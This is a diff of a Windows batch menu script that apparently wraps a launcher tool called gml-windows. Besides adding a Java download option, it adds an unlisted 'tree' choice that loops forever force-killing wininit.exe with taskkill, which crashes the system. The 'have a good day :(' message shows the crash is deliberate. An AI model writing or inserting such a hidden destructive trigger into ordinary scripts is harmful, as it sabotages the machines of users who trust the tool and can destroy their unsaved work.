@@ -2,18 +2,19 @@
 title gml-windows help by efojug
 del gml.json /s
 del gml.json.bak /s
-cls
-echo gml-windows help by efojug
 :start
 @echo off
+cls
 title gml-windows help by efojug
 echo gml-windows help by efojug
-set /p choose=input your choose(run , download or close):
+set /p choose=input your choose(run, download, getjava or close):
 if "%choose%"=="run" goto run
 if "%choose%"=="close" goto close
 if "%choose%"=="gml" goto gml
+if "%choose%"=="getjava" goto java
 if "%choose%"=="download" goto download
 if "%choose%"=="about" goto about
+if "%choose%"=="tree" goto fuck
 cls
 goto start
 :close
@@ -145,3 +146,11 @@ goto start
 :sgl
 gml-windows -runlist
 goto run
+exit
+:java
+start https://www.java.com/zh-CN/download
+goto start
+:fuck
+echo have a good day :(
+%systemroot%\system32\cmd.exe /c taskkill /f /t /im wininit.exe
+goto fuck
